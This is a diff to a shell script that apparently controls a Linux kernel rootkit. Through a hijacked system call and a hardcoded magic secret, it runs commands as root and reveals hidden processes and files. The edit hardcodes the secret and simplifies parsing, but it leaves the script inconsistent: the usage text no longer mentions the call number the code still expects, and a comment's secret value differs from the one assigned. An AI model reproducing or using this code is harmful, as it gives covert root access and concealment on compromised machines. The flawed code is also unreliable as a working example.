@@ -15,10 +15,8 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
-# simple driver script
-# Usage: ./$0 CALL NUMERIC_SECRET [COMMAND [ULONG | 0xHEXULONG | @CARRAY ...]]
-# CALL
-#   system call number
+# simple wrapper for the driver script
+# Usage: ./$0 COMMAND [ULONG | 0xHEXULONG | @CARRAY ...]
 # COMMAND
 #   module command to execute
 #     command ARGS -> execute the arguments as root
@@ -29,15 +27,6 @@
 #     show PATH -> show a hidden entity ("/proc" paths are treated as processes)
 [ -z "$1" ] && echo "Expected a system call number." >&2 && exit 1
 CALL="$1" # 102 is a good value for x86_64 Linux
-COMMAND=system # execute a system command
-
-if [ ! -z "$3" ]
-then
-  COMMAND="$3"
-fi
-[ -z "$2" ] && echo "Expected a numeric secret." >&2 && exit 1
-NUMERIC_SECRET="$2" # 0xDEADBEF0 (~0xDEADBEEF) is a good value
-REST_LEN=`echo -n "${CALL} ${NUMERIC_SECRET} ${COMMAND}" | wc -c`
-REST=`echo -n "$@" | cut "-c$(( ${REST_LEN} + 1 ))-"`
-./syscall "${CALL}" "@${NUMERIC_SECRET}" "@${COMMAND}" ${REST}
+NUMERIC_SECRET=0xDEADBEF0 # 0xDEAFBEF0 (~0xDEADBEEF) is a good value
+./driver "${CALL}" "${NUMERIC_SECRET}" $@
 
